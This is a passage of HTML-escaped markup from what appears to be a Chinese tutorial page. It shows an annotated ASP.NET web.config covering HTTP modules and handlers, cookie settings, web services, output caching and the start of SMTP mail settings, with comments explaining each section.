style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;AnonymousIdentification&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Security.AnonymousIdentificationModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;自定义的URL重写,type基本上就是dll名&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;UrlRewriter&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Intelligencia.UrlRewriter.RewriterHttpModule, Intelligencia.UrlRewriter&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Profile&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Profile.ProfileModule&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;httpModules&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;httpHandlers&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;用于根据用户请求的URL和HTTP谓词将用户的请求交给相应的处理程序。可以在配置级别的任何层次配置此节点，也就是说可以针对某个特定目录下指定的特殊文件进行特殊处理。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;add:&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;指定映射到处理程序的谓词/路径。clear:移除当前已配置或已继承的所有处理程序映射。remove:移除映射到处理程序的谓词/路径。remove 指令必须与前一个 add 指令的谓词/路径组合完全匹配。该指令不支持通配符。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;httpHandlers&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;remove&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*.asmx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*.asmx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;validate&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;*_AppService.axd&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;validate&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;GET,HEAD&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ScriptResource.axd&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;validate&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;verb&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;POST,GET&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;path&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ajaxpro/*.ashx&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;type&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;AjaxPro.AjaxHandlerFactory, AjaxPro.2&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;httpHandlers&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;为 Web 应用程序使用的 Cookie 配置属性。domain:设置 Cookie 域名。httpOnlyCookies:在 Internet Explorer 6 SP1 中启用 HttpOnlyCookies Cookie 的输出。默认值为 false。requireSSL:获取一个指示是否需要安全套接字层 (SSL) 通信的值.&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;httpCookies&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;httpOnlyCookies&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;requireSSL&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;控制 ASP.NET Web 服务及其客户端的行为。protocols:指定传输协议，ASP.NET 可使用这些传输协议来解密 HTTP&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;webServices&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;protocols&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;protocols&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;webServices&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;为 Web 应用程序配置缓存设置。cache:定义全局应用程序缓存设置。outputCache :指定应用程序范围的输出缓存设置。outputCacheSettings:指定可以应用于应用程序中页的输出缓存设置。sqlCacheDependency:为 ASP.NET 应用程序配置 SQL 缓存依赖项。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;caching&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;cache&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;disableMemoryCollection&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;disableExpiration&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt; = &lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;false&lt;/span&gt;&amp;quot; &lt;span style=&quot;color:red&quot;&gt;privateBytesLimit&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt; =&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;0&lt;/span&gt;&amp;quot; &lt;span style=&quot;color:red&quot;&gt;percentagePhysicalMemoryUsedLimit&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt; =&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;90&lt;/span&gt;&amp;quot; &lt;span style=&quot;color:red&quot;&gt;privateBytesPollTime&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt; =&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;00:02:00&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;/&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;设计需要以这种方式缓存的页时，您需要向该页添加以下指令：&amp;lt;%@ OutputCache CacheProfile=&amp;quot;ServerOnly&amp;quot; %&amp;gt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;outputCacheSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;outputCacheProfiles&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;add&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;name&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;ServerOnly&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;duration&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;60&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;varyByCustom&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;browser&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:red&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;color:blue&quot;&gt;=&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;Server&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;outputCacheProfiles&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;outputCacheSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;caching&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;system.web&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;/&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;location&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;网络设置，authenticationModules：指定用于对 Internet 请求进行身份验证的模块。connectionManagement：指定与 Internet 宿主的连接的最大数目。defaultProxy：配置超文本传输协议 (HTTP) 代理服务器。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt; mailSettings&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;：配置简单邮件传输协议 (SMTP) 邮件发送选项。requestCaching：控制网络请求的缓存机制。settings：配置 System.Net 的基本网络选项。&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;system.net&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;!--&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:green;font-size:12px&quot;&gt;配置SMTP电子邮件设置&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;--&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;lt;&lt;/span&gt;&lt;strong&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:16px&quot;&gt;mailSettings&lt;/span&gt;&lt;/strong&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;smtp&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:red;font-size:12px&quot;&gt;from&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;font-size:12px&quot;&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;weipeng&lt;/span&gt;&amp;quot;&lt;span style=&quot;color:blue&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-align:left;&quot;&gt;&lt;span style=&quot;font-family:新宋体;color:blue;font-size:12px&quot;&gt; &amp;nbsp; &amp;nbsp;&amp;lt;&lt;/span&gt;&lt;span style=&quot;font-family:新宋体;color:maroon;font-size:12px&quot;&gt;network&lt;/span&gt;&lt;span 